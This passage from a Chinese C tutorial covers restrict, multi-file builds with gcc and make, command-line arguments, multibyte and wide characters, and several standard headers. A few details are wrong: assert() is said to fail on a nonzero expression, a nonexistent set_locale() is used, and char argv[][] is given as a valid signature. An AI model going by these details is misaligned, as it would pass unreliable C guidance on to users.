的原始内存位置读取），然后对foo和bar进行赋值。如果x被设定为volatile，编译器就不会把它放入缓存，每次都从原始位置去取x的值，因为在两次读取之间，其他程序可能会改变x。 restrictrestrict说明符允许编译器优化某些代码。它只能用于指针，表明该指针是访问数据的唯一方式。 1int* restrict pt = (int*) malloc(10 * sizeof(int)); 上面示例中，restrict表示变量pt是访问 malloc 所分配内存的唯一方式。 下面例子的变量foo，就不能使用restrict修饰符。 12int foo[10];int* bar = foo; 上面示例中，变量foo指向的内存，可以用foo访问，也可以用bar访问，因此就不能将foo设为 restrict。 如果编译器知道某块内存只能用一个方式访问，可能可以更好地优化代码，因为不用担心其他地方会修改值。 restrict用于函数参数时，表示参数的内存地址之间没有重叠。 123456void swap(int* restrict a, int* restrict b) { int t; t = *a; *a = *b; *b = t;} 上面示例中，函数参数声明里的restrict表示，参数a和参数b的内存地址没有重叠。 多文件项目简介一个软件项目往往包含多个源码文件，编译时需要将这些文件一起编译，生成一个可执行文件。 假定一个项目有两个源码文件foo.c和bar.c，其中foo.c是主文件，bar.c是库文件。所谓“主文件”，就是包含了main()函数的项目入口文件，里面会引用库文件定义的各种函数。 123456// File foo.c#include &lt;stdio.h&gt;int main(void) { printf(&quot;%d\\n&quot;, add(2, 3)); // 5!} 上面代码中，主文件foo.c调用了函数add()，这个函数是在库文件bar.c里面定义的。 12345// File bar.cint add(int x, int y) { return x + y;} 现在，将这两个文件一起编译。 1234$ gcc -o foo foo.c bar.c## 更省事的写法$ gcc -o foo *.c 上面命令中，gcc 的-o参数指定生成的二进制可执行文件的文件名，本例是foo。 这个命令运行后，编译器会发出警告，原因是在编译foo.c的过程中，编译器发现一个不认识的函数add()，foo.c里面没有这个函数的原型或者定义。因此，最好修改一下foo.c，在文件头部加入add()的原型。 12345678// File foo.c#include &lt;stdio.h&gt;int add(int, int);int main(void) { printf(&quot;%d\\n&quot;, add(2, 3)); // 5!} 现在再编译就没有警告了。 你可能马上就会想到，如果有多个文件都使用这个函数add()，那么每个文件都需要加入函数原型。一旦需要修改函数add()（比如改变参数的数量），就会非常麻烦，需要每个文件逐一改动。所以，通常的做法是新建一个专门的头文件bar.h，放置所有在bar.c里面定义的函数的原型。 123// File bar.hint add(int, int); 然后使用include命令，在用到这个函数的源码文件里面加载这个头文件bar.h。 12345678// File foo.c#include &lt;stdio.h&gt;#include &quot;bar.h&quot;int main(void) { printf(&quot;%d\\n&quot;, add(2, 3)); // 5!} 上面代码中，#include &quot;bar.h&quot;表示加入头文件bar.h。这个文件没有放在尖括号里面，表示它是用户提供的；它没有写路径，就表示与当前源码文件在同一个目录。 然后，最好在bar.c里面也加载这个头文件，这样可以让编译器验证，函数原型与函数定义是否一致。 123456// File bar.c#include &quot;bar.h&quot;int add(int a, int b) { return a + b;} 现在重新编译，就可以顺利得到二进制可执行文件。 1gcc -o foo foo.c bar.c 重复加载头文件里面还可以加载其他头文件，因此有可能产生重复加载。比如，a.h和b.h都加载了c.h，然后foo.c同时加载了a.h和b.h，这意味着foo.c会编译两次c.h。 最好避免这种重复加载，虽然多次定义同一个函数原型并不会报错，但是有些语句重复使用会报错，比如多次重复定义同一个 Struct 数据结构。解决重复加载的常见方法是，在头文件里面设置一个专门的宏，加载时一旦发现这个宏存在，就不再继续加载当前文件了。 12345// File bar.h#ifndef BAR_H #define BAR_H int add(int, int);#endif 上面示例中，头文件bar.h使用#ifndef和#endif设置了一个条件判断。每当加载这个头文件时，就会执行这个判断，查看有没有设置过宏BAR_H。如果设置过了，表明这个头文件已经加载过了，就不再重复加载了，反之就先设置一下这个宏，然后加载函数原型。 extern 说明符当前文件还可以使用其他文件定义的变量，这时要使用extern说明符，在当前文件中声明，这个变量是其他文件定义的。 1extern int myVar; 上面示例中，extern说明符告诉编译器，变量myvar是其他脚本文件声明的，不需要在这里为它分配内存空间。 由于不需要分配内存空间，所以extern声明数组时，不需要给出数组长度。 1extern int a[]; 这种共享变量的声明，可以直接写在源码文件里面，也可以放在头文件中，通过#include指令加载。 static 说明符正常情况下，当前文件内部的全局变量，可以被其他文件使用。有时候，不希望发生这种情况，而是希望某个变量只局限在当前文件内部使用，不要被其他文件引用。 这时可以在声明变量的时候，使用static关键字，使得该变量变成当前文件的私有变量。 1static int foo = 3; 上面示例中，变量foo只能在当前文件里面使用，其他文件不能引用。 编译策略多个源码文件的项目，编译时需要所有文件一起编译。哪怕只是修改了一行，也需要从头编译，非常耗费时间。 为了节省时间，通常的做法是将编译拆分成两个步骤。第一步，使用 GCC 的-c参数，将每个源码文件单独编译为对象文件（object file）。第二步，将所有对象文件链接在一起，合并生成一个二进制可执行文件。 12345$ gcc -c foo.c ## 生成 foo.o$ gcc -c bar.c ## 生成 bar.o## 更省事的写法$ gcc -c *.c 上面命令为源码文件foo.c和bar.c，分别生成对象文件foo.o和bar.o。 对象文件不是可执行文件，只是编译过程中的一个阶段性产物，文件名与源码文件相同，但是后缀名变成了.o。 得到所有的对象文件以后，再次使用gcc命令，将它们通过链接，合并生成一个可执行文件。 1234$ gcc -o foo foo.o bar.o## 更省事的写法$ gcc -o foo *.o 以后，修改了哪一个源文件，就将这个文件重新编译成对象文件，其他文件不用重新编译，可以继续使用原来的对象文件，最后再将所有对象文件重新链接一次就可以了。由于链接的耗时大大短于编译，这样做就节省了大量时间。 make 命令大型项目的编译，如果全部手动完成，是非常麻烦的，容易出错。一般会使用专门的自动化编译工具，比如 make。 make 是一个命令行工具，使用时会自动在当前目录下搜索配置文件 makefile（也可以写成 Makefile）。该文件定义了所有的编译规则，每个编译规则对应一个编译产物。为了得到这个编译产物，它需要知道两件事。 依赖项（生成该编译产物，需要用到哪些文件） 生成命令（生成该编译产物的命令） 比如，对象文件foo.o是一个编译产物，它的依赖项是foo.c，生成命令是gcc -c foo.c。对应的编译规则如下： 12foo.o: foo.c gcc -c foo.c 上面示例中，编译规则由两行组成。第一行首先是编译产物，冒号后面是它的依赖项，第二行则是生成命令。 注意，第二行的缩进必须使用 Tab 键，如果使用空格键会报错。 完整的配置文件 makefile 由多个编译规则组成，可能是下面的样子。 12345678foo: foo.o bar.o gcc -o foo foo.o bar.ofoo.o: bar.h foo.c gcc -c foo.cbar.o: bar.h bar.c gcc -c bar.c 上面是 makefile 的一个示例文件。它包含三个编译规则，对应三个编译产物（foo.o、bar.o和foo），每个编译规则之间使用空行分隔。 有了 makefile，编译时，只要在 make 命令后面指定编译目标（编译产物的名字），就会自动调用对应的编译规则。 1234567$ make foo.o## or$ make bar.o## or$ make foo 上面示例中，make 命令会根据不同的命令，生成不同的编译产物。 如果省略了编译目标，make命令会执行第一条编译规则，构建相应的产物。 1make 上面示例中，make后面没有编译目标，所以会执行 makefile 的第一条编译规则，本例是make foo。由于用户期望执行make后得到最终的可执行文件，所以建议总是把最终可执行文件的编译规则，放在 makefile 文件的第一条。makefile 本身对编译规则没有顺序要求。 make 命令的强大之处在于，它不是每次执行命令，都会进行编译，而是会检查是否有必要重新编译。具体方法是，通过检查每个源码文件的时间戳，确定在上次编译之后，哪些文件发生过变动。然后，重新编译那些受到影响的编译产物（即编译产物直接或间接依赖于那些发生变动的源码文件），不受影响的编译产物，就不会重新编译。 举例来说，上次编译之后，修改了foo.c，没有修改bar.c和bar.h。于是，重新运行make foo命令时，Make 就会发现bar.c和bar.h没有变动过，因此不用重新编译bar.o，只需要重新编译foo.o。有了新的foo.o以后，再跟bar.o一起，重新编译成新的可执行文件foo。 Make 这样设计的最大好处，就是自动处理编译过程，只重新编译变动过的文件，因此大大节省了时间。 命令行环境命令行参数C 语言程序可以从命令行接收参数。 1./foo hello world 上面示例中，程序foo接收了两个命令行参数hello和world。 程序内部怎么拿到命令行参数呢？C 语言会把命令行输入的内容，放在一个数组里面。main()函数的参数可以接收到这个数组。 1234567#include &lt;stdio.h&gt;int main(int argc, char* argv[]) { for (int i = 0; i &lt; argc; i++) { printf(&quot;arg %d: %s\\n&quot;, i, argv[i]); }} 上面示例中，main()函数有两个参数argc（argument count）和argv（argument variable）。这两个参数的名字可以任意取，但是一般来说，约定俗成就是使用这两个词。 第一个参数argc是命令行参数的数量，由于程序名也被计算在内，所以严格地说argc是参数数量 + 1。 第二个参数argv是一个数组，保存了所有的命令行输入，它的每个成员是一个字符串指针。 以./foo hello world为例，argc是3，表示命令行输入有三个组成部分：./foo、hello、world。数组argv用来获取这些输入，argv[0]是程序名./foo，argv[1]是hello，argv[2]是world。一般来说，argv[1]到argv[argc - 1]依次是命令行的所有参数。argv[argc]则是一个空指针 NULL。 由于字符串指针可以看成是字符数组，所以下面三种写法是等价的。 12345678// 写法一int main(int argc, char* argv[])// 写法二int main(int argc, char** argv)// 写法三int main(int argc, char argv[][]) 另一方面，每个命令行参数既可以写成数组形式argv[i]，也可以写成指针形式*(argv + i)。 利用argc，可以限定函数只能有多少个参数。 1234567891011#include &lt;stdio.h&gt;int main(int argc, char** argv) { if (argc != 3) { printf(&quot;usage: mult x y\\n&quot;); return 1; } printf(&quot;%d\\n&quot;, atoi(argv[1]) * atoi(argv[2])); return 0;} 上面示例中，argc不等于3就会报错，这样就限定了程序必须有两个参数，才能运行。 另外，argv数组的最后一个成员是 NULL 指针（argv[argc] == NULL）。所以，参数的遍历也可以写成下面这样。 123for (char** p = argv; *p != NULL; p++) { printf(&quot;arg: %s\\n&quot;, *p);} 上面示例中，指针p依次移动，指向argv的每个成员，一旦移到空指针 NULL，就表示遍历结束。由于argv的地址是固定的，不能执行自增运算（argv++），所以必须通过一个中间变量p，完成遍历操作。 退出状态C 语言规定，如果main()函数没有return语句，那么结束运行的时候，默认会添加一句return 0，即返回整数0。这就是为什么main()语句通常约定返回一个整数值，并且返回整数0表示程序运行成功。如果返回非零值，就表示程序运行出了问题。 Bash 的环境变量$?可以用来读取上一个命令的返回值，从而知道是否运行成功。 123$ ./foo hello world$ echo $?0 上面示例中，echo $?用来打印环境变量$?的值，该值为0，就表示上一条命令运行成功，否则就是运行失败。 注意，只有main()会默认添加return 0，其他函数都没有这个机制。 环境变量C 语言提供了getenv()函数（原型在stdlib.h）用来读取命令行环境变量。 1234567891011121314#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(void) { char* val = getenv(&quot;HOME&quot;); if (val == NULL) { printf(&quot;Cannot find the HOME environment variable\\n&quot;); return 1; } printf(&quot;Value: %s\\n&quot;, val); return 0;} 上面示例中，getenv(&quot;HOME&quot;)用来获取命令行的环境变量$HOME，如果这个变量为空（NULL），则程序报错返回。 多字节字符本章介绍 C 语言如何处理非英语字符。 Unicode 简介C 语言诞生时，只考虑了英语字符，使用7位的 ASCII 码表示所有字符。ASCII 码的范围是0到127，也就是100多个字符，所以char类型只占用一个字节， 但是，如果处理非英语字符，一个字节就不够了，单单是中文，就至少有几万个字符，字符集就势必使用多个字节表示。 最初，不同国家有自己的字符编码方式，这样不便于多种字符的混用。因此，后来就逐渐统一到 Unicode 编码，将所有字符放入一个字符集。 Unicode 为每个字符提供一个号码，称为码点（code point），其中0到127的部分，跟 ASCII 码是重合的。通常使用“U+十六进制码点”表示一个字符，比如U+0041表示字母A。 Unicode 编码目前一共包含了100多万个字符，码点范围是 U+0000 到 U+10FFFF。完整表达整个 Unicode 字符集，至少需要三个字节。但是，并不是所有文档都需要那么多字符，比如对于 ASCII 码就够用的英语文档，如果每个字符使用三个字节表示，就会比单字节表示的文件体积大出三倍。 为了适应不同的使用需求，Unicode 标准委员会提供了三种不同的表示方法，表示 Unicode 码点。 UTF-8：使用1个到4个字节，表示一个码点。不同的字符占用的字节数不一样。 UTF-16：对于U+0000 到 U+FFFF 的字符（称为基本平面），使用2个字节表示一个码点。其他字符使用4个字节。 UTF-32：统一使用4个字节，表示一个码点。 其中，UTF-8 的使用最为广泛，因为对于 ASCII 字符（U+0000 到 U+007F），它只使用一个字节表示，这就跟 ASCII 的编码方式完全一样。 C 语言提供了两个宏，表示当前系统支持的编码字节长度。这两个宏都定义在头文件limits.h。 MB_LEN_MAX：任意支持地区的最大字节长度，定义在limits.h。 MB_CUR_MAX：当前语言的最大字节长度，总是小于或等于MB_LEN_MAX，定义在stdlib.h。 字符的表示方法字符表示法的本质，是将每个字符映射为一个整数，然后从编码表获得该整数对应的字符。 C 语言提供了不同的写法，用来表示字符的整数号码。 \\123：以八进制值表示一个字符，斜杠后面需要三个数字。 \\x4D：以十六进制表示一个字符，\\x后面是十六进制整数。 \\u2620：以 Unicode 码点表示一个字符（不适用于 ASCII 字符），码点以十六进制表示，\\u后面需要4个字符。 \\U0001243F：以 Unicode 码点表示一个字符（不适用于 ASCII 字符），码点以十六进制表示，\\U后面需要8个字符。 123printf(&quot;ABC\\n&quot;);printf(&quot;\\101\\102\\103\\n&quot;);printf(&quot;\\x41\\x42\\x43\\n&quot;); 上面三行都会输出“ABC”。 12printf(&quot;\\u2022 Bullet 1\\n&quot;);printf(&quot;\\U00002022 Bullet 1\\n&quot;); 上面两行都会输出“• Bullet 1”。 多字节字符的表示C 语言预设只有基本字符，才能使用字面量表示，其它字符都应该使用码点表示，并且当前系统还必须支持该码点的编码方法。 所谓基本字符，指的是所有可打印的 ASCII 字符，但是有三个字符除外：@、$、`。 因此，遇到非英语字符，应该将其写成 Unicode 码点形式。 12char* s = &quot;\\u6625\\u5929&quot;;printf(&quot;%s\\n&quot;, s); // 春天 上面代码会输出中文“春天”。 如果当前系统是 UTF-8 编码，可以直接用字面量表示多字节字符。 12char* s = &quot;春天&quot;;printf(&quot;%s\\n&quot;, s); 注意，\\u + 码点和\\U + 码点的写法，不能用来表示 ASCII 码字符（码点小于0xA0的字符），只有三个字符除外：0x24（$），0x40（@）和0x60（`）。 12char* s = &quot;\\u0024\\u0040\\u0060&quot;;printf(&quot;%s\\n&quot;, s); // @$` 上面代码会输出三个 Unicode 字符“@$`”，但是其它 ASCII 字符都不能用这种表示法表示。 为了保证程序执行时，字符能够正确解读，最好将程序环境切换到本地化环境。 1set_locale(LC_ALL, &quot;&quot;); 上面代码中，使用set_locale()切换到执行环境切换到系统的本地化语言。set_locale()的原型定义在头文件locale.h，详见标准库部分的《locale.h》章节。 像下面这样，指定编码语言也可以。 1setlocale(LC_ALL, &quot;zh_CN.UTF-8&quot;); 上面代码将程序执行环境，切换到中文环境的 UTF-8 编码。 C 语言允许使用u8前缀，对多字节字符串指定编码方式为 UTF-8。 12char* s = u8&quot;春天&quot;;printf(&quot;%s\\n&quot;, s); 一旦字符串里面包含多字节字符，就意味着字符串的字节数与字符数不再一一对应了。比如，字符串的长度为10字节，就不再是包含10个字符，而可能只包含7个字符、5个字符等等。 1234set_locale(LC_ALL, &quot;&quot;);char* s = &quot;春天&quot;;printf(&quot;%d\\n&quot;, strlen(s)); // 6 上面示例中，字符串s只包含两个字符，但是strlen()返回的结果却是6，表示这两个字符一共占据了6个字节。 C 语言的字符串函数只针对单字节字符有效，对于多字节字符都会失效，比如strtok()、strchr()、strspn()、toupper()、tolower()、isalpha()等不会得到正确结果。 宽字符上一小节的多字节字符串，每个字符的字节宽度是可变的。这种编码方式虽然使用起来方便，但是很不利于字符串处理，因此必须逐一检查每个字符占用的字节数。所以除了这种方式，C 语言还提供了确定宽度的多字节字符存储方式，称为宽字符（wide character）。 所谓“宽字符”，就是每个字符占用的字节数是固定的，要么是2个字节，要么是4个字节。这样的话，就很容易快速处理。 宽字符有一个单独的数据类型 wchar_t，每个宽字符都是这个类型。它属于整数类型的别名，可能是有符号的，也可能是无符号的，由当前实现决定。该类型的长度为16位（2个字节）或32位（4个字节），足以容纳当前系统的所有字符。它定义在头文件wchar.h里面。 宽字符的字面量必须加上前缀“L”，否则 C 语言会把字面量当作窄字符类型处理。 1234567set_locale(LC_ALL, &quot;&quot;);wchar_t c = L'牛'；printf(&quot;%lc\\n&quot;, c);wchar_t* s = L&quot;春天&quot;;printf(&quot;%ls\\n&quot;, s); 上面示例中，前缀“L”在单引号前面，表示宽字符，对应printf()的占位符为%lc；在双引号前面，表示宽字符串，对应printf()的占位符为%ls。 宽字符串的结尾也有一个空字符，不过是宽空字符，占用多个字节。 处理宽字符，需要使用宽字符专用的函数，绝大部分都定义在头文件wchar.h。 多字节字符处理函数mblen()mblen()函数返回一个多字节字符占用的字符数。它的原型定义在头文件stdlib.h。 1int mblen(const char* mbstr, size_t n); 它接受两个参数，第一个参数是多字节字符串指针，一般会检查该字符串的第一个字符；第二个参数是需要检查的字节数，这个数字不能大于当前系统单个字符占用的最大字节，一般使用MB_CUR_MAX。 它的返回值是该字符占用的字节数。如果当前字符是空的宽字符，则返回0；如果当前字符不是有效的多字节字符，则返回-1。 1234567setlocale(LC_ALL, &quot;&quot;);char* mbs1 = &quot;春天&quot;;printf(&quot;%d\\n&quot;, mblen(mbs1, MB_CUR_MAX)); // 3char* mbs2 = &quot;abc&quot;;printf(&quot;%d\\n&quot;, mblen(mbs2, MB_CUR_MAX)); // 1 上面示例中，字符串“春天”的第一个字符“春”，占用3个字节；字符串“abc”的第一个字符“a”，占用1个字节。 wctomb()wctomb()函数（wide character to multibyte）用于将宽字符转为多字节字符。它的原型定义在头文件stdlib.h。 1int wctomb(char* s, wchar_t wc); wctomb()接受两个参数，第一个参数是作为目标的多字节字符数组，第二个参数是需要转换的一个宽字符。它的返回值是多字节字符存储占用的字节数量，如果无法转换，则返回-1。 12345678910setlocale(LC_ALL, &quot;&quot;);wchar_t wc = L'牛';char mbStr[10] = &quot;&quot;;int nBytes = 0;nBytes = wctomb(mbStr, wc);printf(&quot;%s\\n&quot;, mbStr); // 牛printf(&quot;%d\\n&quot;, nBytes); // 3 上面示例中，wctomb()将宽字符“牛”转为多字节字符，wctomb()的返回值表示转换后的多字节字符占用3个字节。 mbtowc()mbtowc()用于将多字节字符转为宽字符。它的原型定义在头文件stdlib.h。 12345int mbtowc( wchar_t* wchar, const char* mbchar, size_t count); 它接受3个参数，第一个参数是作为目标的宽字符指针，第二个参数是待转换的多字节字符指针，第三个参数是多字节字符的字节数。 它的返回值是多字节字符的字节数，如果转换失败，则返回-1。 1234567891011setlocale(LC_ALL, &quot;&quot;);char* mbchar = &quot;牛&quot;;wchar_t wc;wchar_t* pwc = &amp;wc;int nBytes = 0;nBytes = mbtowc(pwc, mbchar, 3);printf(&quot;%d\\n&quot;, nBytes); // 3printf(&quot;%lc\\n&quot;, *pwc); // 牛 上面示例中，mbtowc()将多字节字符“牛”转为宽字符wc，返回值是mbchar占用的字节数（占用3个字节）。 wcstombs()wcstombs()用来将宽字符串转换为多字节字符串。它的原型定义在头文件stdlib.h。 12345size_t wcstombs( char* mbstr, const wchar_t* wcstr, size_t count); 它接受三个参数，第一个参数mbstr是目标的多字节字符串指针，第二个参数wcstr是待转换的宽字符串指针，第三个参数count是用来存储多字节字符串的最大字节数。 如果转换成功，它的返回值是成功转换后的多字节字符串的字节数，不包括尾部的字符串终止符；如果转换失败，则返回-1。 下面是一个例子。 12345678910setlocale(LC_ALL, &quot;&quot;);char mbs[20];wchar_t* wcs = L&quot;春天&quot;;int nBytes = 0;nBytes = wcstombs(mbs, wcs, 20);printf(&quot;%s\\n&quot;, mbs); // 春天printf(&quot;%d\\n&quot;, nBytes); // 6 上面示例中，wcstombs()将宽字符串wcs转为多字节字符串mbs，返回值6表示写入mbs的字符串占用6个字节，不包括尾部的字符串终止符。 如果wcstombs()的第一个参数是 NULL，则返回转换成功所需要的目标字符串的字节数。 mbstowcs()mbstowcs()用来将多字节字符串转换为宽字符串。它的原型定义在头文件stdlib.h。 12345size_t mbstowcs( wchar_t* wcstr, const char* mbstr, size_t count); 它接受三个参数，第一个参数wcstr是目标宽字符串，第二个参数mbstr是待转换的多字节字符串，第三个参数是待转换的多字节字符串的最大字符数。 转换成功时，它的返回值是成功转换的多字节字符的数量；转换失败时，返回-1。如果返回值与第三个参数相同，那么转换后的宽字符串不是以 NULL 结尾的。 下面是一个例子。 12345678910setlocale(LC_ALL, &quot;&quot;);char* mbs = &quot;天气不错&quot;;wchar_t wcs[20];int nBytes = 0;nBytes = mbstowcs(wcs, mbs, 20);printf(&quot;%ls\\n&quot;, wcs); // 天气不错printf(&quot;%d\\n&quot;, nBytes); // 4 上面示例中，多字节字符串mbs被mbstowcs()转为宽字符串，成功转换了4个字符，所以该函数的返回值为4。 如果mbstowcs()的第一个参数为NULL，则返回目标宽字符串会包含的字符数量。 assert.hassert()assert.h头文件定义了宏assert()，用于在运行时确保程序符合指定条件，如果不符合，就报错终止运行。 1assert(PI &gt; 3); 上面代码在程序运行到这一行语句时，验证变量是否PI大于3。如果确实大于3，程序继续运行，否则就会终止运行，并且给出报错信息提示。 assert()宏接受一个表达式作为参数，如果表达式的返回值非零，assert()就会报错，在标准错误流stderr中写入一条错误信息，显示没有通过的表达式，以及包含这个表达式的文件名和行号。最后，调用abort()函数终止程序（abort()函数的原型在stdlib.h头文件中）。 12z = x * x - y * y;assert(z &gt;= 0); 上面的assert()语句类似于下面的代码。 1234if (z &lt; 0) { puts(&quot;z less than 0&quot;); abort();} 如果断言失败，程序会中断执行，会显示下面的提示。 1Assertion failed: (z &gt;= 0), function main, file /Users/assert.c, line 14. 上面报错的格式如下。 1Assertion failed: [expression], function [abc], file [xyz], line [nnn]. 上面代码中，方括号的部分使用实际数据替换掉。 使用 assert() 有几个好处：它不仅能自动标识文件和出问题的行号，还有一种无需更改代码就能开启或关闭 assert() 的机制。如果已经确认程序没有问题，不需要再做断言，就在#include &lt;assert.h&gt;语句的前面，定义一个宏NDEBUG。 12#define NDEBUG#include &lt;assert.h&gt; 然后，重新编译程序，编译器就会禁用文件中所有的 assert() 语句。如果程序又出现问题，可以移除这条#define NDBUG指令（或者把它注释掉），再次编译，这样就重新启用了 assert() 语句。 assert() 的缺点是，因为引入了额外的检查，增加了程序的运行时间。 static_assert()C11 引入了静态断言static_assert()，用于在编译阶段进行断言判断。 1static_assert(constant-expression, string-literal); static_assert()接受两个参数，第一个参数constant-expression是一个常量表达式，第二个参数string-literal是一个提示字符串。如果第一个参数的值为false，会产生一条编译错误，第二个参数就是错误提示信息。 1static_assert(sizeof(int) == 4, &quot;64-bit code generation is not supported.&quot;); 上面代码的意思是，如果当前计算机的int类型不等于4个字节，就会编译报错。 注意，static_assert()只在编译阶段运行，无法获得变量的值。如果对变量进行静态断言，就会导致编译错误。 1234int positive(const int n) { static_assert(n &gt; 0, &quot;value must &gt; 0&quot;); return 0;} 上面代码会导致编译报错，因为编译时无法知道变量n的值。 static_assert()的好处是，尽量在编译阶段发现错误，避免运行时再报错，节省开发时间。另外，有些assert()断言位于函数之中，如果不执行该函数，就不会报错，而static_assert()不管函数是否执行，都会进行断言判断。最后，static_assert()不会生成可执行代码，所以不会造成任何运行时的性能损失。 ctype.hctype.h头文件定义了一系列字符处理函数的原型。 字符测试函数这些函数用来判断字符是否属于某种类型。 isalnum()：是否为字母数字 isalpha()：是否为字母 isdigit()：是否为数字 isxdigit()：是否为十六进制数字符 islower()：是否为小写字母 isupper()：是否为大写字母 isblank()：是否为标准的空白字符（包含空格、水平制表符或换行符） isspace()：是否为空白字符（空格、换行符、换页符、回车符、垂直制表符、水平制表符等） iscntrl()：是否为控制字符，比如 Ctrl + B isprint()：是否为可打印字符 isgraph()：是否为空格以外的任意可打印字符 ispunct()：是否为标点符号（除了空格、字母、数字以外的可打印字符） 它们接受一个待测试的字符作为参数。注意，参数类型为int，而不是char，因为它们允许 EOF 作为参数。 如果参数字符属于指定类型，就返回一个非零整数（通常是1，表示为真），否则返回0（表示为伪）。 下面是一个例子，用户输入一个字符，程序判断是否为英文字母。 12345678910111213#include &lt;stdio.h&gt;#include &lt;ctype.h&gt;int main(void) { char ch = getchar(); if (isalpha(ch)) printf(&quot;it is an alpha character.\\n&quot;); else printf(&quot;it is not an alpha character.\\n&quot;); return 0;} 字符映射函数这一类函数返回字符的某种对应形式，主要有两个函数。 tolower()：如果参数是大写字符，返回小写字符，否则返回原始参数。 toupper()：如果参数是小写字符，返回大写字符，否则返回原始参数。 12// 将字符转为大写ch = toupper(ch); 注意，这两个函数不会改变原始字符。 errno.herrno 变量errno.h声明了一个 int 类型的 errno 变量，用来存储错误码（正整数）。 如果这个变量有非零值，表示已经执行的程序发生了错误。 12345678910int x = -1;errno = 0;int y = sqrt(x);if (errno != 0) { fprintf(stderr, &quot;sqrt error; program terminated.\\n&quot;); exit(EXIT_FAILURE);} 上面示例中，计算一个负值的平方根是不允许的，会导致errno不等于0。 如果要检查某个函数是否发生错误，必须在即将调用该函数之前，将errno的值置为0，防止其他函数改变errno的值。 宏变量errno的值通常是两个宏EDOM或ERANGE。这两个宏都定义在errno.h。它们表示调用数学函数时，可能发生的两种错误。 定义域错误（EDOM）：传递给函数的一个参数超出了函数的定义域。例如，负数传入sqrt()作为参数。 取值范围错误（ERANGE）：函数的返回值太大，无法用返回类型表示。例如，1000 传入exp()作为参数，因为 e^1000 太大，无法使用 double 类型表示。 使用数学函数时，可以将errno的值与 EDOM 和 ERANGE 比较，用来确定到底发生了哪一类错误。 float.hfloat.h定义了浮点数类型 float、double、long double 的一些宏，规定了这些类型的范围和精度。 (1) FLT_ROUNDS 宏FLT_ROUNDS表示当前浮点数加法的四舍五入方向。 它有以下可能的值。 -1：不确定。 0：向零舍入。 1：向最近的整数舍入。 2：向正无穷方向舍入。 3：向负无穷方向舍入。 （2）FLT_RADIX 宏FLT_RADIX表示科学计数法的指数部分的底（base），一般总是2。 （3）浮点数类型的最大值 FLT_MAX DBL_MAX LDBL_MAX （4）浮点数类型的最小正值 FLT_MIN DBL_MIN LDBL_MIN （5）两个同类型浮点数之间可表示的最小差值（最小精度） FLT_EPSILON DBL_EPSILON LDBL_EPSILON （6）DECIMAL_DIG 宏DECIMAL_DIG表示十进制有效位数。 （7）FLT_EVAL_METHOD 宏FLT_EVAL_METHOD表示浮点数运算时的类型转换。 它可能有以下值。 -1：不确定。 0：在当前类型中运算。 1：float 和 double 类型的运算使用 double 类型的范围和精度求值。 2：所有浮点数类型的运算使用 long double 类型的范围和精度求值。 （8）浮点数尾数部分的个数 FLT_MANT_DIG DBL_MANT_DIG LDBL_MANT_DIG （9）浮点数指数部分有效数字的个数（十进制） FLT_DIG DBL_DIG LDBL_DIG （10）科学计数法的指数部分的最小次幂（负数） FLT_MIN_EXP DBL_MIN_EXP LDBL_MIN_EXP （11）科学计数法的指数部分的十进制最小次幂（负数） FLT_MIN_10_EXP DBL_MIN_10_EXP LDBL_MIN_10_EXP （12）科学计数法的指数部分的最大次幂 FLT_MAX_EXP DBL_MAX_EXP LDBL_MAX_EXP 科学计数法的指数部分的十进制最大次幂 FLT_MAX_10_EXP DBL_MAX_10_EXP LDBL_MAX_10_EXP inttypes.hC 语言还在头文件 inttypes.h 里面，为 stdint.h 定义的四类整数类型，提供了printf()和scanf()的占位符。 固定宽度整数类型，比如 int8_t。 最小宽度整数类型，比如 int_least8_t。 最快最小宽度整数类型，比如 int_fast8_t。 最大宽度整数类型，比如 intmax_t。 printf()的占位符采用PRI + 原始占位符 + 类型关键字/宽度的形式构成。举例来说，原始占位符为%d，则对应的占位符如下。 PRIdn （固定宽度类型） PRIdLEASTn （最小宽度类型） PRIdFASTn （最快最小宽度类型） PRIdMAX （最大宽度类型） 上面占位符中的n，可以用8、16、32、64代入。 下面是用法示例。 12345678#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;inttypes.h&gt;int main(void) { int_least16_t x = 3490; printf(&quot;The value is %&quot; PRIdLEAST16 &quot;!\\n&quot;, x);} 上面示例中，PRIdLEAST16对应的整数类型为 int_least16_t，原始占位符为%d。另外，printf()的第一个参数用到了多个字符串自动合并的写法。 下面是其它的原始占位符对应的占位符。 %i：PRIin PRIiLEASTn PRIiFASTn PRIiMAX %o：PRIon PRIoLEASTn PRIoFASTn PRIoMAX %u：PRIun PRIuLEASTn PRIuFASTn PRIuMAX %x：PRIxn PRIxLEASTn PRIxFASTn PRIxMAX %X：PRIXn PRIXLEASTn PRIXFASTn PRIXMAX scanf()的占位符规则也与之类似。 %d：SCNdn SCNdLEASTn SCNdFASTn SCNdMAX %i：SCNin SCNiLEASTn SCNiFASTn SCNiMAX %o：SCNon SCNoLEASTn SCNoFASTn SCNoMAX %u：SCNun SCNuLEASTn SCNuFASTn SCNuMAX %x：SCNxn SCNxLEASTn SCNxFASTn SCNxMAX iso646.hiso646.h头文件指定了一些常见运算符的替代拼写。比如，它用关键字and代替逻辑运算符&amp;&amp;。 123if (x &gt; 6 and x &lt; 12)// 等同于if (x &gt; 6 &amp;&amp; x &lt; 12) 它定义的替代拼写如下。 and 替代 &amp;&amp; and_eq 替代 &amp;= bitand 替代 &amp; bitor 替代 | compl 替代 ~ not 替代 ! not_eq 替代 != or 替代 || or_eq 替代 |= xor 替代 ^ xor_eq 替代 ^= limits.hlimits.h提供了用来定义各种整数类型（包括字符类型）取值范围的宏。 CHAR_BIT：每个字符包含的二进制位数。 SCHAR_MIN：signed char 类型的最小值。 SCHAR_MAX：signed char 类型的最大值。 UCHAR_MAX：unsiged char 类型的最大值。 CHAR_MIN：char 类型的最小值。 CHAR_MAX：char 类型的最大值。 MB_LEN_MAX：多字节字符最多包含的字节数。 SHRT_MIN：short int 类型的最小值。 SHRT_MAX：short int 类型的最大值。 USHRT_MAX：unsigned short int 类型的最大值。 INT_MIN：int 类型的最小值。 INT_MAX：int 类型的最大值。 UINT_MAX：unsigned int 类型的最大值。 LONG_MIN：long int 类型的最小值。 LONG_MAX：long int 类型的最大值。 ULONG_MAX：unsigned long int 类型的最大值。 LLONG_MIN：long long int 类型的最小值。 LLONG_MAX：long long int 类型的最大值。 ULLONG_MAX：unsigned long long int 类型的最大值。 下面的示例是使用预处理指令判断，int 类型是否可以用来存储大于 100000 的数。 123#if INT_MAX &lt; 100000 #error int type is too small#endif 